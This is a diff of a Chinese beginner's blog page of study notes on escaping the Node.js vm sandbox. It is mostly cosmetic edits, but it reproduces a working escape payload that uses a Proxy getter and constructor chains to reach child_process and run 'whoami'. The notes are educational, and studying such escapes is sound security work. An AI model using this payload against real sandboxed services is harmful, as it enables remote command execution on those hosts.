@@ -16,19 +16,19 @@
   <meta name="author" content="notbad3">
   <meta name="keywords" content="The quieter you become,the more you are able to hear">
   
-    <meta name="description" content="初学者的学习笔记罢了，没啥含金量。">
+    <meta name="description" content="初学者的学习笔记，没啥含金量。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="初识vm沙箱逃逸">
 <meta property="og:url" content="http://example.com/2023/10/24/VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="rdj&#39;s Blog">
-<meta property="og:description" content="初学者的学习笔记罢了，没啥含金量。">
+<meta property="og:description" content="初学者的学习笔记，没啥含金量。">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/vvv1.png">
 <meta property="og:image" content="http://example.com/img/vvv2.png">
 <meta property="og:image" content="http://example.com/img/vvv3.png">
 <meta property="og:image" content="http://example.com/img/vvv4.png">
 <meta property="article:published_time" content="2023-10-24T12:08:50.000Z">
-<meta property="article:modified_time" content="2023-11-07T09:02:20.918Z">
+<meta property="article:modified_time" content="2023-11-08T08:35:25.711Z">
 <meta property="article:author" content="notbad3">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary_large_image">
@@ -201,7 +201,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          8k 字
+          8.1k 字
         
       </span>
     
@@ -212,7 +212,7 @@
         
         
         
-          67 分钟
+          68 分钟
         
       </span>
     
@@ -254,7 +254,7 @@
             
               <div class="markdown-body">
                 
-                <p>初学者的学习笔记罢了，没啥含金量。</p>
+                <p>初学者的学习笔记，没啥含金量。</p>
 <span id="more"></span>
 
 
@@ -348,7 +348,11 @@
 <p>解释下这个方法：先对<code>toString</code>方法进行了重写(重写不改变方法何时被调用)。<code>console.log(&#39;Hello &#39; + res)</code>时(一个对象与字符串发生了<code>关系</code>)，就会调用<code>toString</code>方法。(感觉有点像PHP中的魔术方法)</p>
 <p>在 <code>toString</code> 方法中，通过 <code>arguments.callee.caller</code> 获取到调用<strong>该方法的函数</strong>的引用，并利用该引用获取到 <code>process</code> 对象，然后使用 <code>child_process</code> 模块的 <code>execSync</code> 方法执行命令 <code>whoami</code>，并将结果转换为字符串返回。实现了<code>RCE</code></p>
 <p>当然，有时即使我们重写了<code>toString</code>函数，但沙箱外并不存在去触发该函数的相关操作或根本不能重写函数，这时我们可以用<code>Proxy</code>来劫持属性：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><br><span class="hljs-keyword">const</span> script = <br><span class="hljs-string">`</span><br><span class="hljs-string">(() =&gt;&#123; //</span><br><span class="hljs-string">    const a = new Proxy(&#123;&#125;, &#123; //代理了空对象并对get方法进行重写，代理对象是指通过使用ES6中的Proxy对象来包装另一个对象，从而可以拦截并重定义该对象的基本操作（比如属性查找、赋值、删除等）。代理对象允许我们在对目标对象进行操作时，可以自定义并添加额外的行为。</span><br><span class="hljs-string">        get: function()&#123;</span><br><span class="hljs-string">            const cc = arguments.callee.caller;</span><br><span class="hljs-string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;)</span><br><span class="hljs-string">    return a</span><br><span class="hljs-string">&#125;)()//这个()为了调用匿名函数</span><br><span class="hljs-string">`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">abc</span>)<br></code></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<span class="hljs-comment">//导入vm模块</span><br><br><span class="hljs-keyword">const</span> script = <br><span class="hljs-string">`</span><br><span class="hljs-string">(() =&gt;&#123; //</span><br><span class="hljs-string">    const a = new Proxy(&#123;&#125;, &#123; //代理了空对象并对get方法进行重写，代理对象是指通过使用ES6中的Proxy对象来包装另一个对象，从而可以拦截并重定义该对象的基本操作（比如属性查找、赋值、删除等）。代理对象允许我们在对目标对象进行操作时，可以自定义并添加额外的行为。</span><br><span class="hljs-string">        get: function()&#123;</span><br><span class="hljs-string">            const cc = arguments.callee.caller;</span><br><span class="hljs-string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;)</span><br><span class="hljs-string">    return a</span><br><span class="hljs-string">&#125;)()//这个()为了调用匿名函数</span><br><span class="hljs-string">`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">abc</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+
 
 
 
@@ -361,6 +365,7 @@
 <p>参考文章：</p>
 <p><code>https://xz.aliyun.com/t/11859</code></p>
 <p><code>https://blog.csdn.net/m0_62422842/article/details/128553953</code></p>
+<p><code>[Proxy 和 Reflect - 掘金 (juejin.cn)](https://juejin.cn/post/6844904090116292616)</code></p>
 
                 
               </div>
